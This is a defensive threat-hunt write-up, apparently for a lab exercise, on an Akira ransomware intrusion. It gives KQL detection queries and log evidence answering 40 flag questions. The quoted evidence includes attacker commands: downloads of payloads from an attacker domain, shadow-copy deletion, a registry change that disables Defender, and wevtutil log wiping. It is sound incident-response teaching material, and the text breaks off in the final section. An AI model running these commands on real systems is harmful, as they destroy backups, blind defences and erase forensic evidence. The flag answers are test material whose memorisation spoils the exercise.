# 🔴 Threat Hunt Report — Akira Ransomware Deployment
### Ashford Sterling Recruitment | January 27, 2026

---

## 📋 Executive Summary

| Field | Details |
|---|---|
| **Analyst** | Sebastian Chrzanowski |
| **Date of Investigation** | January 27–28, 2026 |
| **Incident Type** | Human-Operated Ransomware (Akira) |
| **Severity** | Critical |
| **Affected Hosts** | AS-PC2, AS-SRV |
| **Compromised User** | David.Mitchell |
| **Attack Duration** | ~12 days (pre-staging from Jan 15 to Jan 27) |

A ransomware affiliate returned to the Ashford Sterling Recruitment environment using pre-staged access established during a previous compromise ("The Broker"). The threat actor deployed **Akira ransomware** across two hosts, exfiltrated data, destroyed backups, and covered their tracks using multiple anti-forensics techniques. The attack was fully human-operated, leveraging living-off-the-land binaries, RMM abuse, and credential theft for lateral movement.

---

## 🗺️ Attack Overview (MITRE ATT&CK)

```
Initial Access → Persistence → Discovery → Credential Access
      ↓               ↓             ↓              ↓
  RDP via         AnyDesk       IP Scanner      LSASS Dump
  Guacamole       Backdoor      Net Enum        Named Pipe

Lateral Movement → Defense Evasion → C2 → Exfiltration → Impact
       ↓                  ↓           ↓         ↓            ↓
  RDP to AS-SRV      kill.bat     wsync.exe  exfil_data   Akira
  Stolen Creds      Reg Tamper   AnyDesk      .zip       Ransomware
```

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Remote Desktop Protocol | T1021.001 |
| Persistence | Scheduled Task | T1053.005 |
| Persistence | Remote Access Software (AnyDesk) | T1219 |
| Defense Evasion | Disable or Modify Tools | T1562.001 |
| Defense Evasion | Masquerading | T1036 |
| Defense Evasion | Indicator Removal (Log Wiping) | T1070 |
| Credential Access | LSASS Memory Dump | T1003.001 |
| Discovery | Network Service Discovery | T1046 |
| Discovery | Process Discovery | T1057 |
| Lateral Movement | Lateral Tool Transfer | T1570 |
| Command & Control | Remote Access Software | T1219 |
| Exfiltration | Archive Collected Data | T1560 |
| Impact | Data Encrypted for Impact | T1486 |
| Impact | Inhibit System Recovery | T1490 |

---

## 🚩 Flag Answers with Evidence & KQL

---

### SECTION 1 — Ransom Note Analysis

---

#### 🚩 Q1 — Threat Actor
**Answer:** `Akira`

The ransomware group was identified from the ransom note file `akira_readme.txt` dropped on the victim's desktop. The note contained the group's signature branding, TOR negotiation portal, and unique victim ID.

**KQL Query:**
```kql
DeviceFileEvents
| where FileName =~ "akira_readme.txt"
| project Timestamp, DeviceName, FileName, FolderPath,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T22:18:33Z
DeviceName:         as-srv
FileName:           akira_readme.txt
FolderPath:         C:\Users\AS.SRV.Administrator\Desktop\
InitiatingProcess:  updater.exe
```

---

#### 🚩 Q2 — Negotiation Portal
**Answer:** `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion`

Extracted directly from the ransom note content. Akira operates a TOR-based negotiation portal for victim communication and payment.

---

#### 🚩 Q3 — Victim ID
**Answer:** `813R-QWJM-XKIJ`

Unique victim identifier found in the ransom note, used for negotiations on the Akira TOR portal.

---

#### 🚩 Q4 — Encrypted Extension
**Answer:** `.akira`

**KQL Query:**
```kql
DeviceFileEvents
| where Timestamp > datetime(2026-01-27T22:00:00)
| where DeviceName in ("as-pc2", "as-srv")
| where ActionType == "FileRenamed"
| where FileName has ".akira"
| project Timestamp, DeviceName, FileName, FolderPath,
          InitiatingProcessFileName
| order by Timestamp asc
| take 20
```

---

### SECTION 2 — Infrastructure

---

#### 🚩 Q5 — Payload Domain
**Answer:** `sync.cloud-endpoint.net`

This domain hosted all malicious payloads including `wsync.exe`, `scan.exe`, and `Daniel_Richardson_CV.pdf.exe`. The domain resolved to Cloudflare IPs acting as a reverse proxy to hide the true origin server.

**KQL Query:**
```kql
DeviceNetworkEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where RemoteUrl has "cloud-endpoint.net"
| where ActionType == "ConnectionSuccess"
| project Timestamp, DeviceName, InitiatingProcessFileName,
          RemoteIP, RemotePort, RemoteUrl
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:   2026-01-27T20:17:16Z
RemoteUrl:   sync.cloud-endpoint.net
RemoteIP:    104.21.30.237
InitiatingProcess: powershell.exe
```

---

#### 🚩 Q6 — Ransomware Staging Domain
**Answer:** `cdn.cloud-endpoint.net`

A separate subdomain used specifically for staging the ransomware payload across multiple hosts. Observed in connections from `daniel_richardson_cv.pdf.exe` on AS-PC1 and `runtimebroker.exe` on AS-SRV.

**KQL Query:**
```kql
DeviceNetworkEvents
| where Timestamp > datetime(2026-01-15)
| where RemoteIP in ("172.67.174.46", "104.21.30.237")
| summarize Domains=make_set(RemoteUrl) by DeviceName,
            InitiatingProcessFileName
| order by DeviceName asc
```

**Evidence:**
```
as-pc1 | daniel_richardson_cv.pdf.exe | ["cdn.cloud-endpoint.net"]
as-srv | runtimebroker.exe            | ["sync.cloud-endpoint.net","cdn.cloud-endpoint.net"]
as-srv | wsync.exe                    | ["sync.cloud-endpoint.net","cdn.cloud-endpoint.net"]
```

---

#### 🚩 Q7 — C2 IP Addresses
**Answer:** `172.67.174.46, 104.21.30.237`

Both IPs belong to Cloudflare's infrastructure, acting as a relay/proxy for the attacker's C2 domain. This is a common technique to hide the true C2 server origin.

**KQL Query:**
```kql
DeviceNetworkEvents
| where Timestamp > datetime(2026-01-27)
| where RemoteUrl has "sync.cloud-endpoint.net"
| where DeviceName =~ "as-pc2"
| summarize Domains=make_set(RemoteUrl) by RemoteIP
```

**Evidence:**
```
RemoteIP: 172.67.174.46 | Domains: ["sync.cloud-endpoint.net"]
RemoteIP: 104.21.30.237 | Domains: ["sync.cloud-endpoint.net"]
```

---

#### 🚩 Q8 — Remote Tool Relay Domain
**Answer:** `relay-0b975d23.net.anydesk.com`

AnyDesk was pre-staged as a backdoor RMM tool. The relay domain identifies the specific AnyDesk relay server through which the attacker's session was routed to AS-SRV during the ransomware deployment phase at 22:08 UTC.

**KQL Query:**
```kql
DeviceNetworkEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName in ("as-pc2", "as-srv", "as-pc1")
| where InitiatingProcessFileName =~ "anydesk.exe"
| where RemoteUrl != ""
| project Timestamp, DeviceName, InitiatingProcessFileName,
          RemoteIP, RemotePort, RemoteUrl
| order by Timestamp asc
```

**Evidence:**
```
Timestamp: 2026-01-27T22:08:15Z
DeviceName: as-srv
RemoteIP:   89.187.179.132
RemoteUrl:  relay-0b975d23.net.anydesk.com
```

---

### SECTION 3 — Defense Evasion

---

#### 🚩 Q9 — Evasion Script
**Answer:** `kill.bat`

The script was created by `wsync.exe` and executed via `cmd.exe`. It disabled multiple Windows Defender components and modified the registry to permanently prevent re-enabling.

**KQL Query:**
```kql
DeviceFileEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where FileName =~ "kill.bat"
| project Timestamp, FileName, FolderPath, SHA1,
          InitiatingProcessFileName, ActionType
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T22:02:33Z
FileName:           kill.bat
FolderPath:         C:\ProgramData\kill.bat
SHA1:               5046707a6dbdf70297712dffd90ceca5ac777148
InitiatingProcess:  wsync.exe
```

---

#### 🚩 Q10 — Evasion Script Hash (SHA256)
**Answer:** `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c`

**KQL Query:**
```kql
DeviceFileEvents
| where FileName =~ "kill.bat"
| where FolderPath has "ProgramData"
| project Timestamp, DeviceName, FileName,
          FolderPath, SHA1, SHA256,
          InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
SHA1:   5046707a6dbdf70297712dffd90ceca5ac777148
SHA256: 0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c
```

---

#### 🚩 Q11 — Registry Tampering Value
**Answer:** `DisableAntiSpyware`

The `kill.bat` script used `reg.exe` to permanently disable Windows Defender via registry modification under `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`.

**KQL Query:**
```kql
DeviceRegistryEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where RegistryKey has "Windows Defender"
| where RegistryValueData == "1"
| project Timestamp, ActionType, RegistryKey,
          RegistryValueName, RegistryValueData,
          InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:         2026-01-27T21:03:42Z
RegistryKey:       HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
RegistryValueName: DisableAntiSpyware
RegistryValueData: 1
InitiatingProcess: reg.exe
```

---

#### 🚩 Q12 — Registry Modification Timestamp
**Answer:** `21:03:42`

**KQL Query:**
```kql
DeviceRegistryEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where RegistryValueName =~ "DisableAntiSpyware"
| project Timestamp, ActionType, RegistryKey,
          RegistryValueName, RegistryValueData,
          InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp [UTC]: 2026-01-27T21:03:42.39698Z
→ HH:MM:SS = 21:03:42
```

---

### SECTION 4 — Credential Access

---

#### 🚩 Q13 — Process Hunt Command
**Answer:** `tasklist | findstr lsass`

The ransomware binary (`wsync.exe`) autonomously enumerated running processes to locate LSASS before performing credential theft. The command was executed via `cmd.exe` spawned by `wsync.exe`, indicating built-in credential harvesting capability.

**KQL Query:**
```kql
DeviceProcessEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName in ("as-pc2", "as-srv", "as-pc1")
| where FileName in~ ("tasklist.exe", "findstr.exe")
| where ProcessCommandLine has "lsass"
    or InitiatingProcessCommandLine has "lsass"
| project Timestamp, DeviceName, FileName,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp: 2026-01-27T21:11:00Z
ProcessCommandLine:         tasklist
ParentCommandLine:          cmd.exe /c "tasklist | findstr lsass"
InitiatingProcessFileName:  wsync.exe

Timestamp: 2026-01-27T21:14:43Z
(Repeated — second verification)
```

---

#### 🚩 Q14 — Credential Named Pipe
**Answer:** `\Device\NamedPipe\lsass`

A named pipe to the LSASS process was opened as part of the credential theft operation. This was followed by `ReadProcessMemoryApiCall` via `WmiPrvSE.exe` — 201 reads copying 25,864 bytes of LSASS memory.

**KQL Query:**
```kql
DeviceEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where ActionType == "NamedPipeEvent"
| where AdditionalFields has "lsass"
| project Timestamp, ActionType, AdditionalFields,
          InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp: 2026-01-27T21:42:56Z
PipeName:  \Device\NamedPipe\lsass
Operation: File opened
```

---

### SECTION 5 — Initial Access

---

#### 🚩 Q15 — Remote Access Tool
**Answer:** `AnyDesk`

AnyDesk was downloaded on **January 15, 2026** (12 days before the ransomware attack) using `certutil.exe`. It was installed to `C:\Users\Public\` with a password, establishing a persistent backdoor that survived until the ransomware deployment.

**KQL Query:**
```kql
DeviceFileEvents
| where FileName =~ "AnyDesk.exe"
| where DeviceName =~ "as-pc2"
| project Timestamp, FileName, FolderPath,
          ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:    2026-01-15T04:40:58Z
FileName:     AnyDesk.exe
FolderPath:   C:\Users\Public\AnyDesk.exe
ActionType:   FileCreated
InitProcess:  certutil.exe
CommandLine:  certutil.exe -urlcache -split -f
              https://download.anydesk.com/AnyDesk.exe
              C:\Users\Public\AnyDesk.exe
```

---

#### 🚩 Q16 — Suspicious Execution Path
**Answer:** `C:\Users\Public`

AnyDesk was deliberately installed to `C:\Users\Public\` rather than the standard install path. This location is writable by all users without elevated privileges and is commonly used by attackers to avoid detection and ensure persistence across user sessions.

**KQL Query:**
```kql
DeviceProcessEvents
| where DeviceName =~ "as-pc2"
| where FileName =~ "AnyDesk.exe"
| project Timestamp, FileName, FolderPath,
          ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
FolderPath: C:\Users\Public\AnyDesk.exe
→ Directory: C:\Users\Public
(Standard install: C:\Program Files (x86)\AnyDesk\)
```

---

#### 🚩 Q17 — Attacker External IP
**Answer:** `88.97.164.155`

Identified from AnyDesk direct connection attempts on port **7070** (AnyDesk's peer-to-peer port). The IP appeared three times attempting direct connections to AS-PC2, bypassing the AnyDesk relay infrastructure.

**KQL Query:**
```kql
DeviceNetworkEvents
| where DeviceName =~ "as-pc2"
| where InitiatingProcessFileName =~ "anydesk.exe"
| where RemoteIP !startswith "10."
    and RemoteIP !startswith "172."
    and RemoteIP !startswith "192.168."
    and RemoteUrl !has "anydesk.com"
| project Timestamp, LocalIP, RemoteIP,
          RemotePort, RemoteUrl, ActionType
| order by Timestamp asc
```

**Evidence:**
```
Timestamp: 2026-01-27T19:29:49Z
RemoteIP:  88.97.164.155
RemotePort: 7070
ActionType: ConnectionFailed

Timestamp: 2026-01-27T20:12:20Z
RemoteIP:  88.97.164.155
RemotePort: 44207
ActionType: ConnectionFailed
```

---

#### 🚩 Q18 — Compromised User
**Answer:** `David.Mitchell`

The primary compromised account used throughout the attack. The attacker accessed AS-PC2 via Guacamole RDP under this account and the credentials were later used for lateral movement to AS-SRV.

**KQL Query:**
```kql
DeviceLogonEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where LogonType in ("RemoteInteractive", "Network")
| where ActionType == "LogonSuccess"
| project Timestamp, AccountName, RemoteIP,
          LogonType, ActionType
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:   2026-01-27T19:14:40Z
AccountName: david.mitchell
LogonType:   RemoteInteractive
RemoteIP:    (via Guacamole 10.0.8.5)
```

---

### SECTION 6 — Command & Control

---

#### 🚩 Q19 — Primary C2 Beacon
**Answer:** `wsync`

The pre-staged `RuntimeBroker.exe` beacon from "The Broker" failed to maintain stable communications. A new beacon `wsync.exe` was deployed to `C:\ProgramData\` on AS-PC2 as the primary C2 implant, masquerading as a sync utility.

**KQL Query:**
```kql
DeviceFileEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where FileName =~ "wsync.exe"
| where FolderPath has "ProgramData"
| project Timestamp, FileName, FolderPath,
          SHA1, SHA256, ActionType,
          InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T21:22:26Z
FileName:           wsync.exe
FolderPath:         C:\ProgramData\wsync.exe
InitiatingProcess:  powershell.exe
```

---

#### 🚩 Q20 — Beacon Deployment Location
**Answer:** `C:\ProgramData`

**KQL Query:**
```kql
DeviceFileEvents
| where FileName =~ "wsync.exe"
| where DeviceName =~ "as-pc2"
| project Timestamp, FileName, FolderPath,
          InitiatingProcessFileName
| order by Timestamp asc
```

---

#### 🚩 Q21 — Original Beacon Hash (SHA256)
**Answer:** `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b`

The first version of `wsync.exe` deployed at 21:22. The attacker later killed the process and re-downloaded a replacement version with a different hash.

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-pc2"
| where FileName =~ "wsync.exe"
| where FolderPath has "ProgramData"
| project Timestamp, FileName, SHA1, SHA256,
          ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp [first creation]: 2026-01-27T21:22:26Z
SHA256: 66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b
```

---

#### 🚩 Q22 — Replacement Beacon Hash (SHA256)
**Answer:** `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654`

After killing the original beacon with `Stop-Process -Name wsync -Force`, the attacker re-downloaded and deployed a replacement version with a different SHA256, indicating a modified or updated binary.

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-pc2"
| where FileName =~ "wsync.exe"
| where FolderPath has "ProgramData"
| project Timestamp, FileName, SHA1, SHA256,
          ActionType, InitiatingProcessFileName
| order by Timestamp desc
```

**Evidence:**
```
Timestamp [replacement]: 2026-01-27T21:44:32Z
SHA256: 0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654
```

---

### SECTION 7 — Reconnaissance

---

#### 🚩 Q23 — Network Scanner
**Answer:** `scan.exe`

Advanced IP Scanner was downloaded as `scan.exe` from the C2 domain. After installation via the InnoSetup installer it ran as `advanced_ip_scanner.exe` and performed a full scan of the `10.1.0.0/24` subnet.

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-pc2"
| where FileName =~ "scan.exe"
| project Timestamp, FileName, FolderPath,
          SHA1, SHA256, ActionType,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T20:17:16Z
FileName:           scan.exe
FolderPath:         C:\Users\David.Mitchell\Downloads\scan.exe
ActionType:         FileCreated
InitiatingProcess:  powershell.exe
PowerShell Command: Invoke-WebRequest -Uri
                    "https://sync.cloud-endpoint.net/scan.exe"
                    -OutFile "C:\Users\david.mitchell\Downloads\scan.exe"
```

---

#### 🚩 Q24 — Scanner Hash (SHA256)
**Answer:** `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b`

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-pc2"
| where FileName =~ "scan.exe"
| project Timestamp, FileName, FolderPath,
          SHA1, SHA256
| order by Timestamp asc
```

---

#### 🚩 Q25 — Scanner Execution Arguments
**Answer:** `/portable "C:/Users/david.mitchell/Downloads/" /lng en_us`

The `/portable` flag is significant — it runs Advanced IP Scanner without installing it, leaving minimal forensic traces in the registry. This is a deliberate anti-forensics choice by the attacker.

**KQL Query:**
```kql
DeviceProcessEvents
| where DeviceName =~ "as-pc2"
| where FileName =~ "advanced_ip_scanner.exe"
| project Timestamp, FileName, ProcessCommandLine,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T20:17:59Z
ProcessCommandLine: "advanced_ip_scanner.exe" /portable
                    "C:/Users/david.mitchell/Downloads/" /lng en_us
InitiatingProcess:  scan.tmp
```

---

#### 🚩 Q26 — Enumerated Internal IPs
**Answer:** `10.1.0.154, 10.1.0.183`

After scanning the full subnet, the attacker specifically enumerated network shares on two hosts to identify file shares and confirm targets for lateral movement and exfiltration.

**KQL Query:**
```kql
DeviceProcessEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName in ("as-pc2", "as-srv", "as-pc1")
| where FileName =~ "net.exe"
| where ProcessCommandLine has "view"
| project Timestamp, DeviceName, FileName,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp: 2026-01-27T22:17:40Z
CommandLine: "net.exe" view \\10.1.0.154
InitiatingProcess: powershell.exe

Timestamp: 2026-01-27T22:17:40Z
CommandLine: "net.exe" view \\10.1.0.183
InitiatingProcess: powershell.exe
```

---

### SECTION 8 — Lateral Movement

---

#### 🚩 Q27 — Lateral Movement Account
**Answer:** `as.srv.administrator`

The attacker used credentials obtained from the LSASS dump to authenticate to AS-SRV. The `as.srv.administrator` account was used for the initial RDP session to AS-SRV via Guacamole.

**KQL Query:**
```kql
DeviceLogonEvents
| where DeviceName =~ "as-srv"
| where Timestamp > datetime(2026-01-27)
| where ActionType == "LogonSuccess"
| where LogonType in ("Network", "RemoteInteractive")
| project Timestamp, AccountName, AccountDomain,
          RemoteIP, LogonType, ActionType
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:   2026-01-27T19:22:06Z
AccountName: as.srv.administrator
RemoteIP:    10.0.8.9 (Guacamole)
LogonType:   RemoteInteractive

Timestamp:   2026-01-27T20:18:42Z
AccountName: david.mitchell
RemoteIP:    10.1.0.183 (AS-PC2)
LogonType:   Network
```

---

### SECTION 9 — Tool Transfer

---

#### 🚩 Q28 — First Download Method (LOLBIN)
**Answer:** `bitsadmin.exe`

The attacker first attempted to download `scan.exe` using `bitsadmin`, a native Windows binary (LOLBin). The download failed five times due to incorrect destination paths (`C:\Temp\` did not exist), eventually forcing the attacker to switch to PowerShell IWR.

**KQL Query:**
```kql
DeviceProcessEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where FileName =~ "bitsadmin.exe"
| project Timestamp, FileName, ProcessCommandLine,
          InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
20:14:03 bitsadmin /transfer job1 ... C:\Users\Public\scan.exe          FAILED
20:14:51 bitsadmin /transfer job1 ... C:\Temp\scan.exe                  FAILED (path N/A)
20:15:01 bitsadmin /transfer job1 ... C:\Temp\scan.exe                  FAILED
20:15:06 bitsadmin /transfer job1 ... Downloads\scan.exe                FAILED
20:16:32 bitsadmin /transfer job1 ... Downloads\scan.exe                FAILED
20:17:16 PowerShell Invoke-WebRequest used instead                      SUCCESS
```

---

#### 🚩 Q29 — Fallback Download Method
**Answer:** `Invoke-WebRequest`

After bitsadmin failed, the attacker used the PowerShell `Invoke-WebRequest` cmdlet to successfully download `scan.exe` and subsequently all other tools.

**KQL Query:**
```kql
DeviceEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName =~ "as-pc2"
| where ActionType == "PowerShellCommand"
| where AdditionalFields has "Invoke-WebRequest"
    or AdditionalFields has "IWR"
| project Timestamp, AdditionalFields,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp: 2026-01-27T20:17:16Z
Command:   Invoke-WebRequest -Uri
           "https://sync.cloud-endpoint.net/scan.exe"
           -OutFile "C:\Users\david.mitchell\Downloads\scan.exe"
```

---

### SECTION 10 — Exfiltration

---

#### 🚩 Q30 — Staging Tool
**Answer:** `st.exe`

`st.exe` was deployed to AS-SRV at 22:24 UTC and immediately used to compress data into `exfil_data.zip` for exfiltration. The tool was deployed after the `clean.bat` anti-forensics script ran, suggesting a deliberate sequence: cleanup → stage → exfil.

**KQL Query:**
```kql
DeviceProcessEvents
| where DeviceName =~ "as-srv"
| where Timestamp > datetime(2026-01-27T22:00:00)
| where FileName =~ "st.exe"
| project Timestamp, FileName, ProcessCommandLine,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T22:24:08Z
FileName:           st.exe
Path:               C:\ProgramData\st.exe
InitiatingProcess:  powershell.exe

→ Created immediately after:
  C:\Users\Public\exfil_data.zip
  SHA1: 5ef4155cd81ea0ee8c460175bdeec4c942f22ccc
```

---

#### 🚩 Q31 — Staging Tool Hash (SHA256)
**Answer:** `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015`

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-srv"
| where FileName =~ "st.exe"
| where FolderPath has "ProgramData"
| project Timestamp, FileName, FolderPath,
          SHA1, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
SHA1:   43854042274aee864c3c1bb87763ffdc52e30096
SHA256: 512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015
```

---

#### 🚩 Q32 — Exfiltration Archive
**Answer:** `exfil_data.zip`

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-srv"
| where Timestamp > datetime(2026-01-27T22:20:00)
| where FileName has ".zip"
    or FileName has "exfil"
| project Timestamp, FileName, FolderPath,
          SHA1, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T22:24:09Z
FileName:           exfil_data.zip
FolderPath:         C:\Users\Public\exfil_data.zip
SHA1:               5ef4155cd81ea0ee8c460175bdeec4c942f22ccc
InitiatingProcess:  st.exe
```

---

### SECTION 11 — Ransomware Deployment

---

#### 🚩 Q33 — Ransomware Filename
**Answer:** `updater.exe`

The ransomware on AS-SRV was disguised as a legitimate Google Updater process. The malicious binary was placed in `C:\ProgramData\` while the legitimate Google Updater resides in `C:\Program Files (x86)\Google\GoogleUpdater\` — a classic masquerading technique (T1036).

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-srv"
| where FileName =~ "updater.exe"
| where FolderPath has "ProgramData"
| project Timestamp, FileName, FolderPath,
          SHA1, SHA256, ActionType,
          InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:  2026-01-27T22:15:53Z
FileName:   updater.exe
FolderPath: C:\ProgramData\updater.exe   ← MALICIOUS
vs.
            C:\Program Files (x86)\Google\GoogleUpdater\ ← LEGITIMATE
```

---

#### 🚩 Q34 — Ransomware Hash (SHA256)
**Answer:** `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b`

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-srv"
| where FileName =~ "updater.exe"
| where FolderPath has "ProgramData"
| project Timestamp, FileName, FolderPath,
          SHA1, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
SHA1:   538ea3cabad643a0283b3b19e7e8696030924e1a
SHA256: e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b
```

---

#### 🚩 Q35 — Ransomware Staging Process
**Answer:** `powershell.exe`

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-srv"
| where FileName =~ "updater.exe"
| where FolderPath has "ProgramData"
| where ActionType == "FileCreated"
| project Timestamp, FileName, FolderPath,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
```

**Evidence:**
```
InitiatingProcessFileName:    powershell.exe
InitiatingProcessCommandLine: "powershell.exe"
```

---

#### 🚩 Q36 — Recovery Prevention Command
**Answer:** `wmic shadowcopy delete`

Volume Shadow Copies were deleted to prevent file recovery without paying the ransom. This is a standard Akira TTP observed consistently across their attacks.

**KQL Query:**
```kql
DeviceProcessEvents
| where Timestamp > datetime(2026-01-27)
| where DeviceName in ("as-pc2", "as-srv")
| where ProcessCommandLine has_any (
    "shadowcopy delete",
    "delete shadows",
    "recoveryenabled")
| project Timestamp, DeviceName, FileName,
          ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T22:03:49Z
ProcessCommandLine: wmic shadowcopy delete
CallingProcess:     WMIC.exe
MITRE:              T1490 — Inhibit System Recovery
```

---

#### 🚩 Q37 — Ransom Note Process
**Answer:** `updater.exe`

**KQL Query:**
```kql
DeviceFileEvents
| where Timestamp > datetime(2026-01-27)
| where FileName =~ "akira_readme.txt"
| project Timestamp, DeviceName, FileName,
          FolderPath, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:          2026-01-27T22:18:33Z
FileName:           akira_readme.txt
FolderPath:         C:\Users\AS.SRV.Administrator\Desktop\
InitiatingProcess:  updater.exe

Note: Dropped in 3 locations simultaneously:
  - Desktop\akira_readme.txt
  - Documents\akira_readme.txt
  - Downloads\akira_readme.txt
```

---

#### 🚩 Q38 — Encryption Start Time
**Answer:** `22:18:33`

**KQL Query:**
```kql
DeviceFileEvents
| where FileName =~ "akira_readme.txt"
| where DeviceName =~ "as-srv"
| project Timestamp, FileName, FolderPath,
          InitiatingProcessFileName
| order by Timestamp asc
| take 1
```

**Evidence:**
```
Timestamp [UTC]: 2026-01-27T22:18:33.373367Z
→ HH:MM:SS = 22:18:33
```

---

### SECTION 12 — Anti-Forensics & Scope

---

#### 🚩 Q39 — Cleanup Script
**Answer:** `clean.bat`

The `clean.bat` script performed extensive anti-forensics operations including deleting the ransomware binary and wiping 13+ Windows event log channels to hinder forensic investigation.

**KQL Query:**
```kql
DeviceFileEvents
| where DeviceName =~ "as-srv"
| where FileName =~ "clean.bat"
| project Timestamp, FileName, FolderPath,
          SHA1, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

**Verify log wiping activity:**
```kql
DeviceProcessEvents
| where DeviceName =~ "as-srv"
| where FileName =~ "wevtutil.exe"
| where ProcessCommandLine has " cl "
| project Timestamp, ProcessCommandLine,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

**Evidence:**
```
Timestamp:  2026-01-27T22:20:27Z
FileName:   clean.bat
SHA1:       3ad12b12dd801016567de4f7a70b0379816fa7b9

Executed wevtutil to clear (13 channels):
  wevtutil cl Security
  wevtutil cl System
  wevtutil cl Application
  wevtutil cl "Windows PowerShell"
  wevtutil cl "Microsoft-Windows-PowerShell/Operational"
  wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
  wevtutil cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"
  wevtutil cl "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational"
  wevtutil cl "Microsoft-Windows-TaskScheduler/Operational"
  wevtutil cl "Microsoft-Windows-WinRM/Operational"
  wevtutil cl "Microsoft-Windows-WMI-Activity/Operational"
  wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
  wevtutil cl "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"
```

---

#### 🚩 Q40 — Affected Hosts
**Answer:** `as-pc2, as-srv`

**KQL Query:**
```kql
DeviceFileEvents
| where FileName in~ ("akira_readme.txt", "wsync.exe",
                      "updater.exe", "kill.bat")
| where FolderPath has_any ("ProgramData", "Users")
| summarize
    Files=make_set(FileName),
    Count=count()
    by DeviceName
| order by Count desc
```

**Evidence:**
```
as-pc2:
  - wsync.exe deployed (C2 beacon + ransomware)
  - kill.bat (Defender disabler)
  - scan.exe (network reconnaissance)
  - LSASS credential dump
